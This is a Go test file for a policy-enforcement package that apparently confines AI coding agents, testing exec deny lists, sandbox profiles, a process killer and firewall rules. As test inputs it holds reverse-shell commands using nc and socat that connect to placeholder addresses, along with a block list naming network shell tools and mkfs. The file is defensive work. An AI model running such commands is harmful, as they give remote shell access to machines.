package enforce

import (
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestMatchExec(t *testing.T) {
	p := &Policy{DenyExec: []string{"nc", "socat", "/opt/evil/"}}
	cases := map[string]string{
		"nc -e /bin/sh 1.2.3.4 4444": "nc",
		"/usr/bin/nc 1.2.3.4 80":     "nc",
		"socat TCP:x:1 EXEC:sh":      "socat",
		"/opt/evil/run --flag":       "/opt/evil/",
		"ncat -l 4444":               "", // different binary: not in the list
		"echo nc":                    "",
		"":                           "",
	}
	for cmd, want := range cases {
		got, _ := p.MatchExec(cmd)
		if got != want {
			t.Errorf("MatchExec(%q)=%q want %q", cmd, got, want)
		}
	}
}

func TestSandboxProfileShape(t *testing.T) {
	home := t.TempDir()
	proj := filepath.Join(home, "proj")
	p := Default(home)
	prof := SandboxProfile(p, proj)

	for _, want := range []string{
		"(version 1)", "(allow default)",
		"(deny file-write*", "(deny file-read-data",
		`(subpath "` + canon(filepath.Join(home, ".xmon")) + `")`,
		`(allow file-write* (subpath "` + canon(proj) + `"))`,
	} {
		if !strings.Contains(prof, want) {
			t.Errorf("profile missing %q\n%s", want, prof)
		}
	}
	// Read denial is data-only so the hook socket in ~/.xmon stays reachable.
	if strings.Contains(prof, "(deny file-read*") {
		t.Error("must not deny file-read* (breaks stat/connect on the hook socket)")
	}
}

func TestSandboxProfileEscapes(t *testing.T) {
	p := &Policy{DenyWrite: []string{`/tmp/we"ird\path`}}
	prof := SandboxProfile(p, "")
	if !strings.Contains(prof, `we\"ird\\path`) {
		t.Errorf("quotes/backslashes not escaped:\n%s", prof)
	}
}

func TestProjectInsideDeniedDirStaysProtected(t *testing.T) {
	// A project placed under ~/.ssh must not re-open the credentials dir:
	// the allow for the project root is followed by a re-deny of denied paths below it.
	home := t.TempDir()
	p := &Policy{DenyWrite: []string{filepath.Join(home, "proj", ".git", "hooks")}}
	prof := SandboxProfile(p, filepath.Join(home, "proj"))
	i := strings.Index(prof, "(allow file-write*")
	j := strings.LastIndex(prof, "(deny file-write*")
	if i < 0 || j < i {
		t.Errorf("expected a deny after the project allow:\n%s", prof)
	}
}

func TestPolicyRoundTrip(t *testing.T) {
	home := t.TempDir()
	file := Path(home)
	d := Default(home)
	d.DenyExec = append(d.DenyExec, "mkfs")
	if err := d.Save(file); err != nil {
		t.Fatal(err)
	}
	got, err := Load(file, home)
	if err != nil {
		t.Fatal(err)
	}
	if len(got.DenyExec) != len(d.DenyExec) || got.DenyExec[len(got.DenyExec)-1] != "mkfs" {
		t.Errorf("round trip lost data: %+v", got.DenyExec)
	}
	missing, err := Load(filepath.Join(home, "nope.json"), home)
	if err != nil || len(missing.DenyWrite) == 0 {
		t.Errorf("missing file should yield defaults: %v %+v", err, missing)
	}
}

func TestKillerKillsOnlyTrackedDeniedExec(t *testing.T) {
	var killed []int
	k := &Killer{
		Policy: func() *Policy { return &Policy{DenyExec: []string{"nc"}} },
		Kill:   func(pid int) error { killed = append(killed, pid); return nil },
	}
	// Denied exec inside a monitored tree: killed.
	if a, ok := k.OnExec(4242, "nc -e /bin/sh 1.2.3.4 4444", true); !ok || !a.Killed || a.Matched != "nc" {
		t.Fatalf("expected kill, got %+v ok=%v", a, ok)
	}
	// Same exec outside any agent tree: never touched.
	if _, ok := k.OnExec(5151, "nc -l 80", false); ok {
		t.Error("must not act on processes outside the agent tree")
	}
	// Allowed command in the tree: untouched.
	if _, ok := k.OnExec(6161, "git status", true); ok {
		t.Error("allowed command must not be acted on")
	}
	// Reserved pids are never targeted.
	if _, ok := k.OnExec(1, "nc", true); ok {
		t.Error("must never target pid 1")
	}
	if len(killed) != 1 || killed[0] != 4242 {
		t.Errorf("killed=%v", killed)
	}
}

func TestKillerRealProcess(t *testing.T) {
	cmd := exec.Command("sleep", "30")
	if err := cmd.Start(); err != nil {
		t.Skip("sleep unavailable:", err)
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	k := &Killer{Policy: func() *Policy { return &Policy{DenyExec: []string{"sleep"}} }}
	a, ok := k.OnExec(cmd.Process.Pid, "sleep 30", true)
	if !ok || !a.Killed || a.Err != nil {
		t.Fatalf("kill failed: %+v ok=%v", a, ok)
	}
	select {
	case err := <-done:
		if err == nil {
			t.Error("process exited cleanly; expected it to be killed")
		}
	case <-time.After(5 * time.Second):
		cmd.Process.Kill()
		t.Fatal("process still running after kill")
	}
}

func TestFirewallCommands(t *testing.T) {
	p := &Policy{LoopbackOnlyPrograms: []string{`C:\Users\a\AppData\Local\gemini\gemini.exe`, ""}}
	cmds := FirewallCommands(p)
	if len(cmds) != 2 {
		t.Fatalf("expected v4+v6 for one program, got %d: %v", len(cmds), cmds)
	}
	if !strings.Contains(cmds[0], "action=block") || !strings.Contains(cmds[0], "dir=out") ||
		!strings.Contains(cmds[0], `program="C:\Users\a\AppData\Local\gemini\gemini.exe"`) ||
		!strings.Contains(cmds[0], "0.0.0.0-126.255.255.255,128.0.0.0-255.255.255.255") {
		t.Errorf("bad v4 rule: %s", cmds[0])
	}
	if strings.Contains(cmds[0], "127.") {
		t.Errorf("loopback must stay reachable: %s", cmds[0])
	}
	if len(FirewallCommands(&Policy{})) != 0 {
		t.Error("no programs must produce no commands")
	}
	if rm := FirewallRemoveCommands(); len(rm) != 2 || !strings.Contains(rm[0], "delete rule") {
		t.Errorf("remove commands: %v", rm)
	}
}

func TestSplitCommandKeepsQuotes(t *testing.T) {
	got := splitCommand(`netsh a b program="C:\Program Files\x\y.exe" z=1`)
	want := []string{"netsh", "a", "b", `program=C:\Program Files\x\y.exe`, "z=1"}
	if len(got) != len(want) {
		t.Fatalf("got %q", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("part %d: %q want %q", i, got[i], want[i])
		}
	}
}
